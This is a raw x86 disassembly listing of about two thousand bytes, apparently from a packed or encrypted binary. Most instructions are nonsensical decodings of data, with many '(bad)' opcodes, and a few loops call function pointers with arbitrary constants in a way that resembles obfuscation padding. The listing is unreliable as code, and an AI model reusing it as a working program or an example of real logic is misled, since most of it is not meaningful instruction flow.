  41283b:	neg    ch
  41283d:	add    BYTE PTR [esi-0x54],bl
  412840:	mov    eax,0xb99ff423
  412845:	xchg   esp,eax
  412846:	adc    al,0xe
  412848:	in     eax,0x31
  41284a:	and    al,0xc1
  41284c:	std    
  41284d:	loop   0x412875
  41284f:	inc    eax
  412850:	inc    edx
  412851:	ret    0xff4d
  412854:	mov    esp,0xd936b456
  412859:	mov    ebx,0xd1e978f
  41285e:	dec    ecx
  41285f:	jnp    0x4128d1
  412861:	or     eax,0x68102528
  412866:	add    DWORD PTR [ecx],eax
  412868:	mov    eax,0xb00de939
  41286d:	int    0xbd
  41286f:	pop    esi
  412870:	dec    eax
  412871:	cmp    ah,BYTE PTR [ecx]
  412873:	lahf   
  412874:	cld    
  412875:	ss xchg ecx,eax
  412877:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412878:	test   BYTE PTR [ebp+0xe8d771],cl
  41287e:	daa    
  41287f:	mov    esp,DWORD PTR [edx]
  412881:	mov    bl,0x5
  412883:	call   0x562a:0xefda5a1c
  41288a:	cmp    esi,DWORD PTR ds:0xb93224f6
  412890:	ss aad 0x4d
  412893:	pop    ebp
  412894:	xor    al,0x55
  412896:	test   esp,ebx
  412898:	jnp    0x412876
  41289a:	cmp    DWORD PTR [edi-0x395addd5],esi
  4128a0:	adc    eax,0x2b0aa50a
  4128a5:	pop    edx
  4128a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4128a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4128a8:	popa   
  4128a9:	and    dh,cl
  4128ab:	int3   
  4128ac:	js     0x41289e
  4128ae:	sbb    al,0xbe
  4128b0:	adc    cl,dh
  4128b2:	dec    esp
  4128b3:	mov    edi,0x92c3e5f
  4128b8:	sub    al,0x41
  4128ba:	dec    esi
  4128bb:	push   0xfffffffa
  4128bd:	push   ebx
  4128be:	push   ecx
  4128bf:	cmp    eax,DWORD PTR [ebp+0x1f]
  4128c2:	xchg   edi,eax
  4128c3:	dec    ebp
  4128c4:	xchg   ecx,eax
  4128c5:	mov    ah,0xf6
  4128c7:	fld    DWORD PTR ds:0xc27facc4
  4128cd:	mov    eax,ds:0x62858926
  4128d2:	push   ebx
  4128d3:	and    ebx,0x5f
  4128d6:	push   ss
  4128d7:	xchg   DWORD PTR [edx],ebx
  4128d9:	(bad)  
  4128db:	dec    esi
  4128dc:	data16 (bad) 
  4128de:	(bad)  
  4128df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4128e0:	or     al,0xf4
  4128e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4128e3:	mov    edi,0xc7b102af
  4128e8:	loopne 0x4128e6
  4128ea:	in     eax,0x68
  4128ec:	aas    
  4128ed:	pushf  
  4128ee:	adc    DWORD PTR [ebx+0x58],ebx
  4128f1:	repnz retf 0xa5a2
  4128f5:	mov    cl,0x4b
  4128f7:	(bad)  
  4128f8:	and    edx,DWORD PTR ds:0x5ce0ec50
  4128fe:	stos   BYTE PTR es:[edi],al
  4128ff:	jp     0x4128e9
  412901:	imul   ebx,DWORD PTR [ecx],0xffffffb5
  412904:	clc    
  412905:	adc    al,0x14
  412907:	div    DWORD PTR [eax]
  412909:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41290a:	xchg   edi,eax
  41290b:	ficomp WORD PTR [ecx-0x22]
  41290e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41290f:	mov    dh,0x37
  412911:	inc    edx
  412912:	mov    ah,0xa7
  412914:	repz push ebp
  412916:	dec    edx
  412917:	call   0x42b612ec
  41291c:	les    eax,FWORD PTR [ecx]
  41291e:	ss inc edx
  412920:	cld    
  412921:	cli    
  412922:	les    ebp,FWORD PTR [esp+eax*2]
  412925:	sahf   
  412926:	cmp    BYTE PTR [ebx-0x791bf5b8],0xe6
  41292d:	bound  edi,QWORD PTR [edi-0xb]
  412930:	add    ah,BYTE PTR [ebx+0x11]
  412933:	mov    ecx,0x35587bfc
  412938:	pop    es
  412939:	sbb    eax,0x13504c34
  41293e:	push   0xc7c14c97
  412943:	pusha  
  412944:	out    0x88,eax
  412946:	mov    ebp,0x895abdc4
  41294b:	dec    esi
  41294c:	jge    0x4128d1
  41294e:	sbb    eax,0x87e34847
  412953:	ror    DWORD PTR [eax+0x3f46470d],1
  412959:	pop    edi
  41295a:	shr    BYTE PTR [edx-0x60],1
  41295d:	mov    eax,DWORD PTR [esi+0x76]
  412960:	loope  0x412951
  412962:	mov    eax,0x550b9680
  412967:	ret    0x8fe8
  41296a:	int    0xae
  41296c:	and    DWORD PTR [ebx-0x39032b2f],0x3e
  412973:	out    dx,al
  412974:	dec    edi
  412975:	mov    esp,0xd6d9249e
  41297a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41297b:	stc    
  41297c:	xor    eax,0xd6a79d5f
  412981:	mov    esi,0x7535e687
  412986:	out    dx,eax
  412987:	and    ebx,esp
  412989:	stos   DWORD PTR es:[edi],eax
  41298a:	cwde   
  41298b:	shl    DWORD PTR [ebp+0x7630f5f7],cl
  412991:	push   0x833b0cb9
  412996:	mov    al,0x89
  412998:	jbe    0x41294f
  41299a:	loope  0x41294e
  41299c:	jbe    0x412987
  41299e:	adc    eax,0x6d410a03
  4129a3:	inc    eax
  4129a4:	(bad)  
  4129a5:	jae    0x412a14
  4129a7:	jmp    0xa1b5:0xfcb5159f
  4129ae:	sbb    dl,cl
  4129b0:	jmp    0x8be5f887
  4129b5:	outs   dx,DWORD PTR ds:[esi]
  4129b6:	lods   al,BYTE PTR ds:[esi]
  4129b7:	or     eax,DWORD PTR [eax+0x1d]
  4129ba:	cmp    al,0x3
  4129bc:	jp     0x41298b
  4129be:	cmp    DWORD PTR [ebx+0x413b3a7],eax
  4129c4:	jl     0x4129b1
  4129c6:	sti    
  4129c7:	jo     0x412a19
  4129c9:	xor    al,BYTE PTR [eax+edi*4+0xc]
  4129cd:	ret    0x6a92
  4129d0:	inc    esp
  4129d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4129d2:	add    DWORD PTR ds:0x681013c7,0x37
  4129d9:	ss sub eax,0x225fbde
  4129df:	call   0x83e:0xfcb5dc0d
  4129e6:	push   edi
  4129e7:	jno    0x412980
  4129e9:	mov    ecx,0x7c888399
  4129ee:	add    DWORD PTR [edx],ebp
  4129f0:	leave  
  4129f1:	adc    edi,DWORD PTR [eax+0x4e9e6927]
  4129f7:	lods   eax,DWORD PTR ds:[esi]
  4129f8:	push   0x20c2c9b8
  4129fd:	dec    ebx
  4129fe:	addr16 ds mov ch,0x22
  412a03:	inc    eax
  412a04:	cmp    ah,bl
  412a06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412a07:	je     0x4129c3
  412a09:	test   al,0x6a
  412a0b:	dec    eax
  412a0c:	jno    0x412a86
  412a0e:	push   0x2
  412a10:	ss sbb ebp,ebx
  412a13:	arpl   WORD PTR [ebp+0x6fc607bd],ax
  412a19:	dec    ebx
  412a1a:	inc    esp
  412a1b:	retf   
  412a1c:	push   edi
  412a1d:	out    0x52,eax
  412a1f:	xor    BYTE PTR [ecx],dl
  412a21:	test   eax,0x28bfabb3
  412a26:	enter  0x8387,0x7e
  412a2a:	mov    al,0x2
  412a2c:	inc    esp
  412a2d:	sub    al,0xc4
  412a2f:	js     0x412a99
  412a31:	stos   DWORD PTR es:[edi],eax
  412a32:	sti    
  412a33:	aas    
  412a34:	inc    ebp
  412a35:	push   0xf4f9e86c
  412a3a:	mov    esi,DWORD PTR [esi+0x5c]
  412a3d:	jmp    0x1228:0xc1364fd8
  412a44:	fwait
  412a45:	pop    es
  412a46:	aam    0x90
  412a48:	iret   
  412a49:	jmp    0x74e0:0x386bc4c4
  412a50:	add    ebx,DWORD PTR [eax-0x50]
  412a53:	push   esp
  412a54:	mov    al,bl
  412a56:	push   0xd1126645
  412a5b:	test   eax,0x487808c6
  412a60:	in     eax,0x50
  412a62:	push   edx
  412a63:	mov    BYTE PTR [eax+eax*8-0x3a],0x7c
  412a68:	cmc    
  412a69:	and    eax,0xf1599bf1
  412a6e:	into   
  412a6f:	mov    ecx,0xf3cecfd5
  412a74:	fdiv   QWORD PTR [edx+0x6ce9cb2]
  412a7a:	jnp    0x412ada
  412a7c:	(bad)  
  412a7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412a7f:	adc    ebx,esi
  412a81:	adc    edx,DWORD PTR [esi+0x15]
  412a84:	push   es
  412a85:	xchg   BYTE PTR ds:0x2e672821,al
  412a8b:	jecxz  0x412ab1
  412a8d:	aaa    
  412a8e:	adc    ch,0xf
  412a91:	test   BYTE PTR [eax],dl
  412a93:	add    BYTE PTR [eax],al
  412a95:	add    BYTE PTR [ebx+0x3d03144d],cl
  412a9b:	mov    al,ds:0x8b0042e1
  412aa0:	or     DWORD PTR [ebx],ecx
  412aa2:	test   BYTE PTR [ecx+0x5c7e44d],0x75
  412aa9:	std    
  412aaa:	inc    edx
  412aab:	add    BYTE PTR [edi],dl
  412aad:	add    BYTE PTR [eax],al
  412aaf:	add    BYTE PTR [ebx+0x42fd753d],al
  412ab5:	add    BYTE PTR [eax],al
  412ab7:	je     0x412b09
  412abd:	cmp    DWORD PTR ds:0x42fd75,0x24
  412ac4:	jne    0x412af1
  412aca:	push   0x5fda
  412acf:	push   0x42de
  412ad4:	push   0x6b28
  412ad9:	push   0x4e0a
  412ade:	push   DWORD PTR [ebp-0x10]
  412ae1:	push   0x8dcd
  412ae6:	push   0x86d4
  412aeb:	call   DWORD PTR ds:0x42e397
  412af1:	mov    edi,DWORD PTR ds:0x42fd75
  412af7:	dec    edi
  412af8:	mov    DWORD PTR ds:0x42fd75,edi
  412afe:	jmp    0x412ab0
  412b03:	and    ecx,DWORD PTR ds:0x42e1a8
  412b09:	imul   edx,eax
  412b0c:	mov    ecx,0x4573
  412b11:	add    DWORD PTR ds:0x42e198,edx
  412b17:	add    edx,ecx
  412b19:	mov    esi,0x7879
  412b1e:	sub    edi,0x22a0
  412b24:	mov    edi,0x1556
  412b29:	jmp    0x412e0d
  412b2e:	retf   
  412b2f:	sbb    eax,eax
  412b31:	inc    esp
  412b32:	loopne 0x412ba7
  412b34:	push   ebx
  412b35:	mov    bl,0x1a
  412b37:	ror    BYTE PTR [edi],cl
  412b39:	ja     0x412acc
  412b3b:	cmp    al,0x6c
  412b3d:	sbb    edx,DWORD PTR [ecx]
  412b3f:	data16 jo 0x412bb2
  412b42:	mov    ecx,0xb370707e
  412b47:	(bad)  
  412b48:	or     DWORD PTR [di-0x1f],ebx
  412b4c:	inc    ecx
  412b4d:	push   esi
  412b4e:	or     al,0x43
  412b50:	adc    bh,al
  412b52:	push   es
  412b53:	mov    eax,0x1d3841c2
  412b58:	sbb    bl,dl
  412b5a:	dec    ecx
  412b5b:	mov    ebx,0x1e7b4e
  412b60:	test   DWORD PTR [esi],eax
  412b62:	fucomi st,st(3)
  412b64:	imul   ebx,DWORD PTR [ebp-0x1f],0x7351ab3e
  412b6b:	mov    ecx,0xb87dc00a
  412b70:	(bad)  
  412b71:	aaa    
  412b72:	add    al,0xf0
  412b74:	call   0xc480:0xa939f18
  412b7b:	fcomp  QWORD PTR [ecx+ebp*4-0x72]
  412b7f:	push   ecx
  412b80:	(bad)  
  412b81:	mov    bl,BYTE PTR [ebx-0x22]
  412b84:	mov    dl,0x79
  412b86:	loop   0x412bfb
  412b88:	mov    dh,0xe
  412b8a:	setl   cl
  412b8d:	pop    edi
  412b8e:	jb     0x412bac
  412b90:	fs or  eax,0xecf64627
  412b96:	jo     0x412bbc
  412b98:	pop    ecx
  412b99:	or     ecx,DWORD PTR [edi-0x7ec28446]
  412b9f:	or     BYTE PTR [edx+0x7b],dh
  412ba2:	lea    ecx,[ebp+0x77dfd362]
  412ba8:	push   edx
  412ba9:	jbe    0x412c16
  412bab:	push   DWORD PTR [edi-0x72]
  412bae:	sub    al,0x81
  412bb0:	sub    al,al
  412bb2:	nop
  412bb3:	adc    cl,BYTE PTR [esi-0x6d94b8bd]
  412bb9:	fs movs BYTE PTR es:[edi],BYTE PTR cs:[esi]
  412bbc:	aaa    
  412bbd:	bound  ecx,QWORD PTR [eax+0x2f]
  412bc0:	sar    ah,0xca
  412bc3:	inc    esi
  412bc4:	xor    DWORD PTR [ecx],esi
  412bc6:	mov    edx,0x723c383
  412bcb:	cs push 0x2bab394d
  412bd1:	je     0x412be0
  412bd3:	addr16 mov eax,cs:0x29e7
  412bd8:	(bad)  
  412bd9:	cmp    DWORD PTR [esp+ecx*8+0x7e98db74],esi
  412be0:	clc    
  412be1:	pusha  
  412be2:	mov    ebp,0x38fe3f01
  412be7:	stc    
  412be8:	(bad)  
  412be9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412bea:	gs dec esi
  412bec:	lds    esp,FWORD PTR [eax]
  412bee:	je     0x412ba5
  412bf0:	adc    BYTE PTR [ebx+eiz*8-0x4d],bh
  412bf4:	xor    DWORD PTR [ebp+0x478b2d6c],ecx
  412bfa:	in     al,dx
  412bfb:	ins    DWORD PTR es:[edi],dx
  412bfc:	pushf  
  412bfd:	jp     0x412bfd
  412bff:	jne    0x412c4a
  412c01:	add    bl,bl
  412c03:	idiv   eax
  412c05:	push   edi
  412c06:	bound  eax,QWORD PTR [edx+0x1016f488]
  412c0c:	mov    ch,0xeb
  412c0e:	push   esp
  412c0f:	jno    0x412bd8
  412c11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412c12:	retf   0xacc
  412c15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412c16:	pop    edx
  412c17:	nop
  412c18:	nop
  412c19:	or     eax,0x55673e33
  412c1e:	xor    ebp,eax
  412c20:	xchg   esp,eax
  412c21:	mov    eax,0x943b3f40
  412c26:	icebp  
  412c27:	fidiv  WORD PTR [edx]
  412c29:	clc    
  412c2a:	in     al,dx
  412c2b:	mov    ah,0x15
  412c2d:	add    esi,DWORD PTR [edx*2-0x69ed25ff]
  412c34:	nop
  412c35:	pushf  
  412c36:	mov    ah,0x7b
  412c38:	fmul   st(5),st
  412c3a:	sub    DWORD PTR ds:0x9c194ab6,0xffffffdb
  412c41:	outs   dx,BYTE PTR ds:[esi]
  412c42:	leave  
  412c43:	mov    bl,0x8
  412c45:	es lahf 
  412c47:	rcr    DWORD PTR [edx-0x53],1
  412c4a:	fcomp  QWORD PTR [edi+0x56]
  412c4d:	xor    al,BYTE PTR ds:0x14c0a632
  412c53:	sar    DWORD PTR [ebp+0x90d4dc3],0x99
  412c5a:	jle    0x412ca0
  412c5c:	ja     0x412c44
  412c5e:	out    0x3f,al
  412c60:	lock outs dx,DWORD PTR ds:[esi]
  412c62:	push   es
  412c63:	xor    eax,0x69611a72
  412c68:	push   0xffffffb9
  412c6a:	(bad)  
  412c6c:	xor    al,0xca
  412c6e:	popf   
  412c6f:	or     DWORD PTR [eax+ebp*1-0x2b3508bf],ebx
  412c76:	lods   al,BYTE PTR ds:[esi]
  412c77:	mov    eax,0xebd96701
  412c7c:	mov    bh,0xcc
  412c7e:	add    dl,BYTE PTR [ecx+edx*1]
  412c81:	scas   al,BYTE PTR es:[edi]
  412c82:	repnz xor DWORD PTR [edi-0xe],ecx
  412c86:	jle    0x412c13
  412c88:	fmul   QWORD PTR [eax+0xb739af8]
  412c8e:	ror    DWORD PTR [ebx+ebp*8+0x77d58e97],1
  412c95:	fsub   st(6),st
  412c97:	mov    al,0xa0
  412c99:	sahf   
  412c9a:	mov    ebp,0x49e7b7c3
  412c9f:	jne    0x412d1c
  412ca1:	jnp    0x412d22
  412ca3:	add    cl,BYTE PTR [ebx-0x6781bb83]
  412ca9:	add    eax,DWORD PTR ds:0xb33e0d2e
  412caf:	mov    BYTE PTR [edi-0x7e],ch
  412cb2:	jnp    0x412d0b
  412cb4:	adc    eax,0x38c16657
  412cb9:	and    ecx,ebx
  412cbb:	cdq    
  412cbc:	jnp    0x412d1c
  412cbe:	pop    es
  412cbf:	cmp    ah,ah
  412cc1:	add    DWORD PTR [eax],ebp
  412cc3:	cmp    esi,DWORD PTR [ebx+0x67]
  412cc6:	mov    cl,0x9d
  412cc8:	xor    DWORD PTR [edi-0x3283ab96],edi
  412cce:	test   BYTE PTR [esi+0x37176002],ch
  412cd4:	out    0xdf,al
  412cd6:	clc    
  412cd7:	mov    ds:0xe98c0f65,al
  412cdc:	sahf   
  412cdd:	push   cs
  412cde:	lods   al,BYTE PTR ds:[esi]
  412cdf:	ds repnz dec esi
  412ce2:	cmp    esp,0x3434bae5
  412ce8:	cld    
  412ce9:	fsubp  st(4),st
  412ceb:	sbb    BYTE PTR [edx],bl
  412ced:	push   ebp
  412cee:	mov    esi,0x8038aa0a
  412cf3:	dec    eax
  412cf4:	push   cs
  412cf5:	dec    edi
  412cf6:	cwde   
  412cf7:	add    edx,ebp
  412cf9:	xchg   BYTE PTR [ebx],dl
  412cfb:	mov    eax,0xde7c32fc
  412d00:	sub    al,0xd5
  412d02:	data16 dec dl
  412d05:	adc    BYTE PTR [esi+0x79],bl
  412d08:	inc    ebx
  412d09:	adc    DWORD PTR [ebx+0x2b09322],eax
  412d0f:	ret    
  412d10:	sub    dh,0x59
  412d13:	push   cs
  412d14:	in     eax,0xd9
  412d16:	mov    al,ds:0x51a20083
  412d1b:	mov    cs,ecx
  412d1d:	mov    DWORD PTR [ebp-0x52],edi
  412d20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412d21:	inc    ebx
  412d22:	xor    eax,0x6c840614
  412d27:	and    ah,0x51
  412d2a:	pushf  
  412d2b:	in     al,0xe3
  412d2d:	dec    ecx
  412d2e:	inc    eax
  412d2f:	pushf  
  412d30:	jle    0x412d91
  412d32:	or     esi,esp
  412d34:	mov    al,ds:0x4ab921e6
  412d39:	adc    eax,0x431b8f77
  412d3e:	aaa    
  412d3f:	jle    0x412d80
  412d41:	adc    BYTE PTR [esi-0x6],bh
  412d44:	std    
  412d45:	adc    al,0xaa
  412d47:	jg     0x412cfd
  412d49:	add    dl,BYTE PTR [esp+ebp*4]
  412d4c:	es hlt 
  412d4e:	push   ss
  412d4f:	aam    0x32
  412d51:	add    ch,dh
  412d53:	das    
  412d54:	jb     0x412cf6
  412d56:	jb     0x412d4a
  412d58:	mov    ebp,0x2250f1b0
  412d5d:	int    0x52
  412d5f:	and    BYTE PTR [ebx],dh
  412d61:	pop    ds
  412d62:	inc    eax
  412d63:	dec    edi
  412d64:	add    eax,DWORD PTR [edx-0x55]
  412d67:	add    al,0x4
  412d69:	ret    0x7d1d
  412d6c:	cli    
  412d6d:	stos   BYTE PTR es:[edi],al
  412d6e:	popa   
  412d6f:	mov    ebp,0x7748d4eb
  412d74:	clc    
  412d75:	pop    edi
  412d76:	pop    ss
  412d77:	dec    ecx
  412d78:	fs jmp esp
  412d7b:	(bad)  
  412d7c:	sbb    esi,DWORD PTR [edx+ebx*1]
  412d7f:	fnsave [edx+0x69]
  412d82:	sub    eax,0xd7266401
  412d87:	mov    ds:0xe8a26691,eax
  412d8c:	int3   
  412d8d:	repz int3 
  412d8f:	frstor [ebx+0x48]
  412d92:	data16 rol BYTE PTR [ecx],0x9d
  412d96:	jbe    0x412dd2
  412d98:	cmp    ah,dh
  412d9a:	call   FWORD PTR ds:0xb277dbf5
  412da0:	das    
  412da1:	sti    
  412da2:	push   ds
  412da3:	nop
  412da4:	outs   dx,BYTE PTR es:[esi]
  412da6:	dec    ebp
  412da7:	cdq    
  412da8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412da9:	inc    BYTE PTR [ecx]
  412dab:	std    
  412dac:	xor    al,0xbc
  412dae:	pop    edx
  412daf:	or     ebp,ebx
  412db1:	adc    BYTE PTR [edx],dh
  412db3:	hlt    
  412db4:	leave  
  412db5:	lods   al,BYTE PTR ds:[esi]
  412db6:	inc    esp
  412db7:	mov    ebx,0xd9d354e5
  412dbc:	xor    cl,dl
  412dbe:	pop    es
  412dbf:	out    dx,eax
  412dc0:	scas   al,BYTE PTR es:[edi]
  412dc1:	jg     0x412d59
  412dc3:	mov    DWORD PTR [ecx-0x7558958c],eax
  412dc9:	retf   
  412dca:	aaa    
  412dcb:	sbb    DWORD PTR [ecx+0x39b1f494],0xffffffb9
  412dd2:	retf   
  412dd3:	sub    eax,0xae21b10
  412dd8:	mov    ch,0xe8
  412dda:	int3   
  412ddb:	mov    cs,ebx
  412ddd:	out    0xe1,al
  412ddf:	mov    esp,0x1f21685d
  412de4:	xchg   ecx,eax
  412de5:	call   0xfb83:0x1a3f278d
  412dec:	jb     0x412e41
  412dee:	std    
  412def:	fdiv   DWORD PTR [esi-0x572872c0]
  412df5:	dec    ecx
  412df6:	ror    DWORD PTR [ebx-0x69],cl
  412df9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412dfa:	loope  0x412d8a
  412dfc:	sti    
  412dfd:	jnp    0x412dcf
  412dff:	push   edx
  412e00:	cli    
  412e01:	add    DWORD PTR [ebp-0x61890f5a],ebp
  412e07:	fldenv [eax-0x3aaa50f3]
  412e0d:	xchg   esi,ecx
  412e0f:	and    DWORD PTR ds:0x42e19c,0x0
  412e19:	jmp    0x412e2d
  412e1e:	xor    ecx,ecx
  412e20:	add    ecx,DWORD PTR ds:0x42e19c
  412e26:	inc    ecx
  412e27:	mov    DWORD PTR ds:0x42e19c,ecx
  412e2d:	cmp    DWORD PTR ds:0x42e19c,0x17
  412e34:	jae    0x412e60
  412e3a:	cmp    DWORD PTR ds:0x42e19c,0x25
  412e41:	jne    0x412e55
  412e47:	push   0x286f
  412e4c:	push   DWORD PTR [ebp-0x18]
  412e4f:	call   DWORD PTR ds:0x42e507
  412e55:	jmp    0x412e1e
  412e5a:	xor    ecx,0x7ba7
  412e60:	sub    edx,edi
  412e62:	xor    esi,esi
  412e64:	jmp    0x413148
  412e69:	call   0x6aab08c6
  412e6e:	jno    0x412ee7
  412e70:	popa   
  412e71:	push   ebx
  412e72:	xchg   eax,esp
  412e74:	arpl   WORD PTR [ebx+0x5aaeed68],bx
  412e7a:	fs jo  0x412eed
  412e7d:	mov    ecx,0x3370707e
  412e82:	(bad)  [ebx]
  412e84:	aas    
  412e85:	dec    ebx
  412e86:	mov    edx,0x6e7a3625
  412e8b:	inc    eax
  412e8c:	cmp    eax,0x4ae3ec34
  412e91:	push   edi
  412e92:	sub    al,0x6
  412e94:	push   cs
  412e95:	mov    al,ds:0x1b7633ce
  412e9a:	and    BYTE PTR [edx],al
  412e9c:	pop    ebp
  412e9d:	pop    ebx
  412e9e:	xchg   esi,eax
  412e9f:	xor    cl,BYTE PTR ds:0x1503ac60
  412ea5:	into   
  412ea6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ea7:	mov    esp,0xc4d1c47a
  412eac:	xchg   edi,eax
  412ead:	sub    BYTE PTR [ebx],dh
  412eaf:	test   DWORD PTR [edi-0x6a80e43],ebp
  412eb5:	(bad)  ss:[esi]
  412eb8:	popf   
  412eb9:	(bad)  
  412eba:	sbb    BYTE PTR [edi-0x79afeb61],bh
  412ec0:	stos   BYTE PTR es:[edi],al
  412ec1:	pop    esi
  412ec2:	imul   ecx,DWORD PTR [edx+0x338030af],0x74c4ac51
  412ecc:	iret   
  412ecd:	sbb    al,0x60
  412ecf:	mov    ebp,0xe858c812
  412ed4:	sahf   
  412ed5:	or     BYTE PTR [edi],ch
  412ed7:	cmp    eax,0xc7da636a
  412edc:	rcl    BYTE PTR [esi],cl
  412ede:	aam    0xca
  412ee0:	hlt    
  412ee1:	arpl   WORD PTR [edi+0x6],di
  412ee4:	pop    ds
  412ee5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412ee6:	imul   edx,DWORD PTR [edx-0x41826130],0xffffffcc
  412eed:	les    esp,FWORD PTR [eax-0x7a]
  412ef0:	xchg   edi,eax
  412ef1:	call   0x7ece457
  412ef6:	aaa    
  412ef7:	xchg   esp,eax
  412ef8:	push   cs
  412ef9:	sbb    DWORD PTR [edx],esp
  412efb:	jl     0x412ea0
  412efd:	pop    edi
  412efe:	and    edx,DWORD PTR [edx-0x74]
  412f01:	popa   
  412f02:	fisttp DWORD PTR [ebx-0x3a9d3483]
  412f08:	aaa    
  412f09:	jmp    0x412f7c
  412f0b:	stos   DWORD PTR es:[edi],eax
  412f0c:	dec    edi
  412f0d:	xchg   esp,eax
  412f0e:	dec    eax
  412f0f:	jnp    0x412f3a
  412f11:	loop   0x412ee2
  412f13:	adc    DWORD PTR [edi+edi*2+0x33],esi
  412f17:	xchg   edx,eax
  412f18:	(bad)  
  412f19:	mov    ebx,DWORD PTR [eax]
  412f1b:	lods   eax,DWORD PTR ds:[esi]
  412f1c:	ret    
  412f1d:	leave  
  412f1e:	or     esp,esp
  412f20:	cmp    cl,al
  412f22:	fsub   DWORD PTR [esi-0x17]
  412f25:	push   ebp
  412f26:	aam    0xd0
  412f28:	je     0x412f79
  412f2a:	loopne 0x412ef0
  412f2c:	loope  0x412f95
  412f2e:	sub    esi,esi
  412f30:	mov    bh,0xa7
  412f32:	icebp  
  412f33:	cmp    al,0xf9
  412f35:	in     eax,dx
  412f36:	sub    BYTE PTR [eax-0x6fd891e4],0x1b
  412f3d:	add    BYTE PTR [edx],0x85
  412f40:	xlat   BYTE PTR ds:[ebx]
  412f41:	out    dx,al
  412f42:	ficomp DWORD PTR [edx+0x5ddc850]
  412f48:	xchg   esi,eax
  412f49:	mov    edi,0xff6ba8ff
  412f4e:	ins    DWORD PTR es:[edi],dx
  412f4f:	cs jo  0x412f4d
  412f52:	fcom   DWORD PTR [ecx-0x7a]
  412f55:	lods   eax,DWORD PTR ds:[esi]
  412f56:	push   cs
  412f57:	shl    DWORD PTR [edx],0x9e
  412f5a:	iret   
  412f5b:	out    0x89,eax
  412f5d:	retf   
  412f5e:	cdq    
  412f5f:	addr16 (bad) 
  412f61:	push   ecx
  412f62:	sub    ecx,DWORD PTR [ecx+edx*4]
  412f65:	mov    dh,0x43
  412f67:	jnp    0x412f03
  412f69:	outs   dx,DWORD PTR ds:[esi]
  412f6a:	rol    cl,1
  412f6c:	lock push es
  412f6e:	outs   dx,BYTE PTR ds:[esi]
  412f6f:	jnp    0x412f65
  412f71:	add    DWORD PTR [esi],0x42
  412f74:	stos   DWORD PTR es:[edi],eax
  412f75:	xlat   BYTE PTR ds:[ebx]
  412f76:	cli    
  412f77:	sub    dl,dh
  412f79:	dec    ebp
  412f7a:	(bad)  
  412f7b:	nop
  412f7c:	je     0x412f42
  412f7e:	test   eax,0xb87f52cb
  412f83:	mov    eax,0x7dceaec4
  412f88:	ss data16 jp 0x412fa8
  412f8c:	sbb    ecx,DWORD PTR [edx]
  412f8e:	push   edx
  412f8f:	cli    
  412f90:	sub    dl,cl
  412f92:	push   eax
  412f93:	rol    BYTE PTR [eax-0x7f6044b0],1
  412f99:	fsub   DWORD PTR [ecx-0x216a819b]
  412f9f:	call   0x5a2df808
  412fa4:	loop   0x413018
  412fa6:	hlt    
  412fa7:	inc    edi
  412fa8:	or     BYTE PTR [esi+0x70],bl
  412fab:	fadd   DWORD PTR [eax-0x73]
  412fae:	out    0x44,eax
  412fb0:	scas   eax,DWORD PTR es:[edi]
  412fb1:	imul   ebp,DWORD PTR [edi+0x5a],0xfffffff3
  412fb5:	out    dx,al
  412fb6:	inc    ebp
  412fb7:	out    dx,eax
  412fb8:	nop
  412fb9:	or     BYTE PTR [edi],dh
  412fbb:	add    al,0x7a
  412fbd:	rol    DWORD PTR [ebp+0x57],0xe4
  412fc1:	pop    ebp
  412fc2:	dec    edx
  412fc3:	lods   eax,DWORD PTR ds:[esi]
  412fc4:	jp     0x412ff8
  412fc6:	fnstenv [eax+0x7f]
  412fc9:	mov    cl,0x3b
  412fcb:	dec    edi
  412fcc:	ins    BYTE PTR es:[edi],dx
  412fcd:	icebp  
  412fce:	mov    dl,0x9e
  412fd0:	loope  0x412fc0
  412fd2:	stc    
  412fd3:	sbb    eax,0x9d1193ca
  412fd8:	jp     0x41301a
  412fda:	retf   0xe625
  412fdd:	sbb    esp,DWORD PTR [esi+0x14]
  412fe0:	call   0x4860:0xbf396ae9
  412fe7:	jg     0x412fb9
  412fe9:	dec    eax
  412fea:	and    DWORD PTR [ecx],esi
  412fec:	ret    0x425b
  412fef:	arpl   bp,sp
  412ff1:	lods   al,BYTE PTR ds:[esi]
  412ff2:	or     BYTE PTR [esi-0x52],ah
  412ff5:	xchg   esp,eax
  412ff6:	ror    DWORD PTR [ebx-0x2],0xc3
  412ffa:	inc    esi
  412ffb:	cmp    BYTE PTR [ebx],dl
  412ffd:	icebp  
  412ffe:	sub    edx,DWORD PTR [edx+edx*8+0x5294989a]
  413005:	mov    WORD PTR [ebp-0x12aefed8],?
  41300b:	neg    BYTE PTR [esi-0x1990ed0e]
  413011:	jns    0x413028
  413013:	cs jbe 0x413026
  413016:	mov    ecx,0x7dcca333
  41301b:	inc    edi
  41301c:	les    ebp,FWORD PTR [edx+0x55a92f10]
  413022:	sbb    al,0x2a
  413024:	dec    DWORD PTR [esi+eax*1]
  413027:	hlt    
  413028:	mov    cl,bh
  41302a:	xchg   esi,eax
  41302b:	adc    al,BYTE PTR [esi-0xcead57]
  413031:	or     eax,0xc936bec7
  413036:	(bad)  
  413037:	(bad)  
  413038:	loopne 0x412fee
  41303a:	leave  
  41303b:	or     al,0x53
  41303d:	add    edi,DWORD PTR [esi]
  41303f:	and    DWORD PTR [esi+ebx*1],ebx
  413042:	lds    eax,FWORD PTR [edi+0x6d]
  413045:	(bad)  
  413046:	mov    ecx,0xf320f011
  41304b:	inc    ecx
